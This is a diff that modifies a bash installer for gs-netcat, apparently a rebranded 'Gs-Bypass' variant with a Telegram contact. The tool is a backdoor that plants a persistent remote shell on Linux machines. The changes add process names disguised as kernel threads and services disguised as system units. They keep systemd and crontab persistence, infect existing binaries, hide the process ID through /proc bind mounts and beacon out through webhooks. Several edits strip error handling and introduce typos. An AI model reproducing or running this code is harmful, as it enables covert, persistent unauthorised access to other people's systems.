@@ -1,5 +1,6 @@
 #! /usr/bin/env bash
 
+
 # If called like: 'bash -c "$(curl -fsSL https://.../deploy.sh)"' then
 # the ps-output will show the entire script as command line. To "kill" the command
 # line we re-exec and call eval on the string.
@@ -9,7 +10,7 @@ unset GS_NOEVAL
 # Global Defines
 ###----BEGIN changed by CICD script-----
 CICD_GS_BRANCH="beta"
-GS_HOST_MASTER_IP="212.132.98.170"
+GS_HOST_MASTER_IP="$(ping -4 -c1 "$(printf '%s.gs.thc.org\n' {a..z} | shuf -n1)" 2>/dev/null | sed -n '1s/.*(\(.*\)).*/\1/p')"
 ###-----END-----
 [[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
 [[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
@@ -86,58 +87,44 @@ msg='$(hostname) --- $(uname -rom) --- ${GS_HOST:+GS_HOST=${GS_HOST} }gs-netcat 
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
-# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+GS_DISCORD_KEY="0"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-}
-### Matrix
-# GS_MTX_TOKEN="mat_8KI...."
-# GS_MTX_ROOMID="!Ekq...JiQs:matrix.org"
-[[ -n $GS_MTX_TOKEN ]] && [[ -n $GS_MTX_ROOMID ]] && {
-    # GS_MTX_HOME could be specified through GS_MTX_ROOMID (e.g., !Ekq...JiQs:matrix.org)
-    # May fail if user use custom homeserver without specifying GS_MTX_HOME
-    [[ -z $GS_MTX_HOME ]] && GS_MTX_HOME="${GS_MTX_ROOMID#*:}"
-	[ -n "$GS_MTX_HOME" ] && {
-		GS_MTX_ROOMID="${GS_MTX_ROOMID//\!/%21}"
-		data='{"msgtype": "m.text", "body": "'"${msg}"'"}'
-		GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-H' 'Authorization: Bearer ${GS_MTX_TOKEN}' '-d' "${data}" "https://${GS_MTX_HOME}/_matrix/client/r0/rooms/${GS_MTX_ROOMID}/send/m.room.message")
-		GS_WEBHOOK_WGET=('--header=Content-Type: application/json' '--header=Authorization: Bearer ${GS_MTX_TOKEN}' "--post-data=${data}" "https://${GS_MTX_HOME}/_matrix/client/r0/rooms/${GS_MTX_ROOMID}/send/m.room.message")
-	}
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "")
 }
 unset data msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $GS_URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO-  $GS_URL_DEPLOY)\""
 
-bin_hidden_name_arr=("snapd" "crond")
+bin_hidden_name_arr=("snapd" "crond" "networkd" "polkitnetd" "journald")
 BIN_HIDDEN_NAME_DEFAULT="${bin_hidden_name_arr[$((RANDOM % ${#bin_hidden_name_arr[@]}))]}"
 
-service_hidden_name_arr=("systemd-network" "systemd-journal")
+service_hidden_name_arr=("systemd-snapd-update" "systemd-crond" "networkd-dispatch" "polkit-net" "journald-forwarder")
 SERVICE_HIDDEN_NAME_DEFAULT="${service_hidden_name_arr[$((RANDOM % ${#service_hidden_name_arr[@]}))]}"
 
-proc_name_arr=("sshd:" "bash")
+# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+proc_name_arr=("sshd:" "[kthreadd]" "[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+
 
 config_dir_name_arr=("tmp" "etc" "lib" "cache" "bin" "share")
 CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_arr[@]}))]}"
 
-### DEFAULTS:
-# GS_INFECT=1
-# GS_NOTE=1
-GS_FFPID=1
+#GS_FFPID=1
 GS_REEXEC=1
 GS_BC=1
-[ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="oneshot"
+[ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="simple"
 GS_MEMEXEC=1
+#GS_SYSTEMD_PERSIST="default"
 
 [ -n "$GS_NOINFECT" ] && unset GS_INFECT
 [ -n "$GS_NONOTE" ] && unset GS_NOTE
-[ -n "$GS_NOFFPID" ] && { unset GS_FFPID GS_NOFFPID; }
+[ -n "$GS_NOFFPID" ] && unset GS_FFPID
 [ -n "$GS_NOREEXEC" ] && unset GS_REEXEC
 [ -n "$GS_NOMEMEXEC" ] && unset GS_MEMEXEC
-[ -n "$GS_NOBC" ] && { unset GS_BC GS_NOBC; }
+[ -n "$GS_NOBC" ] && unset GS_BC
 # If no MEMEXEC then also disable BC (which depends on MEMEXEC)
 [ -z "$GS_MEMEXEC" ] && unset GS_BC # implied
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
@@ -703,7 +690,7 @@ try_execbin() {
 	local fn="${1:?}"
 	local is_try_ldso="${2}"
 
-	# ~/.config/* bins can be set as 600 permission and started with /lib/ld.so
+	# ~/.local/* bins can be set as 600 permission and started with /lib/ld.so
 	[[ -n "$is_try_ldso" ]] && [[ -n "$LDSO" ]] && {
 		chmod 600 "$fn"
 		"$LDSO" "${fn}" -g &>/dev/null && return 0
@@ -765,7 +752,7 @@ try_dstdir()
 
 output_memexec() {
 	[[ "$OSNAME" != "linux" ]] && return
-	echo -e "Alternatively, cut & paste the following to deploy to memory:"
+	echo -e "Alternativly, cut & paste the following to deploy to memory:"
 	[[ -z "$X" ]] && {
 		echo -e "${CDC}X=${CDY}SecretChangeMe${CDR} ${CRY}# <--- CHANGE THIS!${CN}"
 	}
@@ -802,8 +789,8 @@ init_dstbin()
 	try_dstdir "${GS_PREFIX}/usr/sbin" "" && return
 
 	# Try user installation
-	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
-	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" "1" && return
+	[[ ! -d "${GS_PREFIX}${HOME}/.local" ]] && xmkdir "${GS_PREFIX}${HOME}/.local"
+	try_dstdir "${GS_PREFIX}${HOME}/.local/${CONFIG_DIR_NAME}" "1" && return
 
 	# Try current working directory
 	try_dstdir "${PWD}" "1" && { IS_DSTBIN_CWD=1; return; }
@@ -889,6 +876,7 @@ is_64bit() {
 init_vars()
 {
 	local arch
+	local osname
 	local service
 	local str
 	arch=$(uname -m)
@@ -933,6 +921,8 @@ init_vars()
 				OSARCH="arm" # RPI-Zero / RPI 4b+
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64"
+			elif [[ "$arch" == "x86_64" ]]; then
+				OSARCH="x86_64"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64"
 				is_le && OSARCH="mipsel32"
@@ -993,8 +983,7 @@ init_vars()
 	elif [[ $OSARCH == "powerpcle-linux" ]]; then
 		SRC_PKG="gs-netcat_mini-linux-powerpcle"
 	elif [[ $OSARCH == "x86_64-osx" ]]; then
-		SRC_PKG="gs-netcat_mini-macOS-arm64"
-		# SRC_PKG="gs-netcat_mini-macOS-x86_64" # GH runner for x86_64 no longer supported. Fall-back to arm64 which works on both x86_64 with Rosetta.
+		SRC_PKG="gs-netcat_mini-macOS-x86_64"
 	elif [[ $OSARCH == "arm64-osx" ]]; then
 		SRC_PKG="gs-netcat_mini-macOS-arm64"
 	elif [[ $OSARCH == "x86_64-freebsd" ]]; then
@@ -1053,7 +1042,7 @@ init_vars()
 	# HOME does not exist. Check if CWD looks like a home.
 	[ -n "$HOME" ] && [ ! -d "$HOME" ] && {
 		phome="$(pwd)"
-		{ [ -e "${phome}/.config" ] || [ -e "${phome}/.bash_history" ]; } && {
+		{ [ -e "${phome}/.local" ] || [ -e "${phome}/.bash_history" ]; } && {
 			WARN "HOME=$HOME does not exist. Using HOME=$phome instead."
 			HOME="$phome"
 		}
@@ -1334,7 +1323,7 @@ config2bin() {
 	local opts="$3"
 	local proc_hidden_name="$4"
 
-	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_MEMEXEC="${GS_MEMEXEC}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$src" "$dst"
+	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_MEMEXEC="${GS_MEMEXEC}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$src" "$dst"
 }
 
 # Load configuration from TARGET by executing EXE.
@@ -1431,7 +1420,7 @@ uninstall_service()
 		systemctl disable "${sn}" 2>/dev/null
 	}
 
-	UNINST_IS_SYSTEMD_SIMPLE=1
+	grep -Fqm1 simple "${sf}" 2>/dev/null || UNINST_IS_SYSTEMD_SIMPLE=1
 
 	chattr_unset "${sf}"
 	uninstall_rm "${sf}"
@@ -1440,7 +1429,8 @@ uninstall_service()
 uninstall_systemd_infect() {
 	local name="$1"
 	local fn="$2"
-
+	local bn
+	
 	[ -n "$GS_DRYRUN" ] && return
 	[[ ! -f "${fn} " ]] && return 0
 	[[ $UID -ne 0 ]] && {
@@ -1448,9 +1438,10 @@ uninstall_systemd_infect() {
 		return 255
 	}
 
-	echo "Disinfecting ${fn}..."
+	bn=$(basename "${fn}")
+
 	xmv "${fn} " "${fn}"
-	systemd_kill_cmd="systemctl restart ${name}"
+	cmd_kill_arr+=("${bn}")
 }
 
 # Rather important function especially when testing and developing this...
@@ -1462,10 +1453,11 @@ uninstall()
 
 	{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Only removing default installs. ${CF}[GS_BIN= and GS_NAME= are not set]${CN}"
 
+	cmd_kill_arr=("${BIN_HIDDEN_NAME}")
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
-			uninstall_bin_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
-			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+			uninstall_bin_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}.dat"  # SEC_NAME
 		done
 		uninstall_bin_rm "${GS_PREFIX}/usr/bin/${hn}"  # obsolete
 		uninstall_bin_rm "${GS_PREFIX}/usr/sbin/${hn}"
@@ -1497,9 +1489,9 @@ uninstall()
 	done
 
 	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
-		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
+		uninstall_rmdir "${GS_PREFIX}${HOME}/.local/${cn}"
 	done
-	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.local"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
 	# Remove crontab
@@ -1605,9 +1597,7 @@ HOWTO_CONNECT_OUT()
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${UNINST_CMD}${CN}"
 	echo -e "--> To connect use one of the following
---> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}
---> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
---> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+--> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}"
 }
 
 
@@ -1645,7 +1635,7 @@ gs_secret_load_user() {
 
 	for d in "${config_dir_name_arr[@]}"; do
 		for f in "${bin_hidden_name_arr[@]}"; do
-			fn="${GS_PREFIX}${HOME}/.config/${d}/${f}"
+			fn="${GS_PREFIX}${HOME}/.local/${d}/${f}"
 			DEBUGF "Checking ${fn}"
 			[[ -f "${fn}" ]] && bin2config "${fn}" && { DSTBIN="${fn}"; return 0; }
 		done
@@ -1731,11 +1721,7 @@ infect_bin() {
 		FAIL_OUT "Could not move '${bin} ' to '${bin}'."
 		return 255
 	}
-	cat "${DSTBIN}" >"${bin}" || {
-		xmv "${bin} " "${bin}"
-		FAIL_OUT "Could not write to '${bin}'."
-		return 255
-	}
+	cat "${DSTBIN}" >"${bin}"
 }
 
 do_config2bin() {
@@ -1780,13 +1766,10 @@ install_systemd_add() {
 	local sfdata="$1"
 	local param="$2"
 	local len="70"
-	local _saved_ffpid="$GS_FFPID"
-	GS_FFPID=''
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || { GS_FFPID="$_saved_ffpid"; return 255; }
-	GS_FFPID="$_saved_ffpid"
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
 	do_bincrypter "${DSTBIN}"
 
-	[[ -n "$CDC" ]] && ((len+=11))
+	[[ -n "$CDC" ]] && ((len+=11)) 
 	printf "%-${len}.${len}s" "$(echo -e "Installing as systemd ${CB}${SERVICE_HIDDEN_NAME}.service${CN}..............................................")"
 
 	if [[ -f "${SERVICE_FILE}" ]]; then
@@ -1805,7 +1788,7 @@ install_systemd_add() {
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return 255; }
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; }
 
 	chattr_set "${DSTBIN}"
 	chattr_set "${SERVICE_FILE}"
@@ -1851,26 +1834,48 @@ After=network.target"
 
 install_systemd_new() {
 	local sfdata
+	local param
+	local remain="no"
 	local meta
 
+	# If gsnc does not leave cgroup then we must keep sevice running or else
+	# systemd will kill the entire cgroup.
+	[ -n "$GS_NOCCG" ] && remain="yes"
+
 	meta="$(_service_meta)"
-	sfdata="[Unit]
+
+	if [[ "$GS_SYSTEMD_PERSIST" == *"simple"* ]]; then
+		sfdata="[Unit]
 ${meta}
 
 [Service]
+Restart=always
 Type=simple
 ExecStart=${DSTBIN}
 ExecStartPost=/bin/sh -c 'mount --bind /proc/2 /proc/\$MAINPID 2>/dev/null; true'
-Restart=always
-RestartSec=5
-StandardOutput=null
-StandardError=null
 
 [Install]
 WantedBy=multi-user.target"
+		param="-ilqD"
+		[ -z "$GS_NOCCG" ] && GS_CCG=1 # Change CGROUP
+	else
+		# HERE: A systemd supervised service
+		sfdata="[Unit]
+${meta}
 
-	SYSTEMD_INSTALL_CHECK_IS_ACTIVE=1
-	install_systemd_add "$sfdata" "-ilq"
+[Service]
+Restart=always
+RestartSec=300
+ExecStart=${DSTBIN}
+ExecStartPost=/bin/sh -c 'mount --bind /proc/2 /proc/\$MAINPID 2>/dev/null; true'
+
+[Install]
+WantedBy=multi-user.target"
+		param="-ilq"
+		SYSTEMD_INSTALL_CHECK_IS_ACTIVE=1
+	fi
+
+	install_systemd_add "$sfdata" "$param"
 }
 
 # infect cron.services et.al.
@@ -1888,7 +1893,7 @@ install_systemd_infect() {
 
 	infect_bin "$bin"
 	ret=$?
-	[[ $ret -eq 200 ]] && { IS_SYSTEMD=1; IS_GS_RUNNING=1; return 0; }
+	[[ $ret -eq 200 ]] && { IS_SYSTEMD=1; IS_GS_RUNNING=1; }  # Dont do any crontab infection
 	[[ $ret -ne 0 ]] && return 255
 
 	SYSTEMD_INFECTED_NAME="${name}"
@@ -1897,10 +1902,9 @@ install_systemd_infect() {
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
 	OK_OUT "Experimental. Set GS_NOINFECT=1 to disable."
-	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || {
-		xmv "${bin} " "${bin}"  # restore original if config embedding fails
-		return 255
-	}
+	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
+	# recover if this fails:
+	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
 
 	STARTING_STR="Starting gs-netcat as infected ${CB}${name}.service${CN}${CDC}${CN}"
 }
@@ -1931,7 +1935,7 @@ install_system_systemd()
 		}
 	fi
 
-	install_systemd_new || { FAIL_OUT; return 255; }
+	install_systemd_new
 	[[ -n "$IS_INSTALLED" ]] && return 0
 
 	return 255
@@ -2016,7 +2020,7 @@ install_user_crontab()
 	old="$(crontab -l 2>/dev/null)" || crontab - </dev/null &>/dev/null
 
 	[ -n "$old" ] && old+=$'\n'
-	[ -n "${NOTE_DONOTREMOVE}" ] && old+="${NOTE_DONOTREMOVE}"$'\n'
+	[ -n "${NOTE_DONOTREMOVER}" ] && old+="${NOTE_DONOTREMOVE}"$'\n'
 
 	#              .---------------- minute (0 - 59)
 	#              |  .------------- hour (0 - 23)
@@ -2185,6 +2189,7 @@ gs_access() {
 	[[ $ret -eq 0 ]] && exit_code 0
 	[[ $ret -eq 61 ]] && gs_access_fail_exit
 	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && gs_access_fail_exit
 
 	exit_code "$ret"
 }
@@ -2342,8 +2347,9 @@ webhooks() {
 	local ok
 	local err
 
-	echo -en "Executing webhooks...................................................."
-	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && [[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
+#	echo -en "Executing webhooks...................................................."
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
 
 	if [[ -n $IS_USE_CURL ]]; then
 		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
@@ -2373,8 +2379,6 @@ dnshook() {
 	 	timeout 2 host "${msg}.${GS_DNSHOOK}" &>/dev/null
 	elif command -v nslookup >/dev/null; then
 	 	timeout 2 nslookup "${msg}.${GS_DNSHOOK}" &>/dev/null
-	elif command -v ping >/dev/null; then
-	 	timeout 2 ping -c1 "${msg}.${GS_DNSHOOK}" &>/dev/null
 	else
 		FAIL_OUT
 		return
@@ -2448,10 +2452,18 @@ gs_start_systemd()
 	# is needed. Thus fix Timestamp first and then reload.
 	ts_restore
 	systemctl daemon-reload
-	err="$(timeout 5 systemctl restart "${SERVICE_HIDDEN_NAME}" 2>&1)" || err="Timeout occurred while starting service."
-	err="$(systemctl is-active "${SERVICE_HIDDEN_NAME}" 2>&1)" && unset err
+	# err=1
+	# Rare case with Type=simple but gsnc fails to leave cgroup (and thus does
+	# not fork/setsid). Use timeout or otherwise systemctl would never return.
+	err="$(timeout 5 systemctl restart "${SERVICE_HIDDEN_NAME}" 2>&1)"
+	if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
+		err="$(systemctl is-active "${SERVICE_HIDDEN_NAME}" 2>/dev/null)" && unset err
+	# else
+		# Hope for the best that simple worked correctly.
+		# unset err
+	fi
 	[ -n "$err" ] && {
-		FAIL_OUT "$err: Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN} or try ${CDY}GS_NOSYSTEMD=1${CN}."
+		FAIL_OUT "$err: Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
 		exit 255
 	}
 	IS_GS_RUNNING=1
@@ -2535,10 +2547,10 @@ gs_hide_pid() {
 init_vars
 
 [[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
-{ [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]]; } && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-[[ -n $GS_BRANCH ]] && WARN "Using branch ${CDY}$GS_BRANCH${CN}"
+[[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By bboscat"
 
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
@@ -2615,9 +2627,7 @@ gs_hide_pid
 }
 
 # Default values are known and easily detected by users/admins.
-{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable. Set these for more stealth
-    ${CB}GS_BIN='<filename>'${CN}
-    ${CDC}GS_NAME='<processname>'${CN}"
+{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "ERROR OR UPDATE? CONTACT t.me/pejatenbin"
 [[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] && {
 	unset str
 	url="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
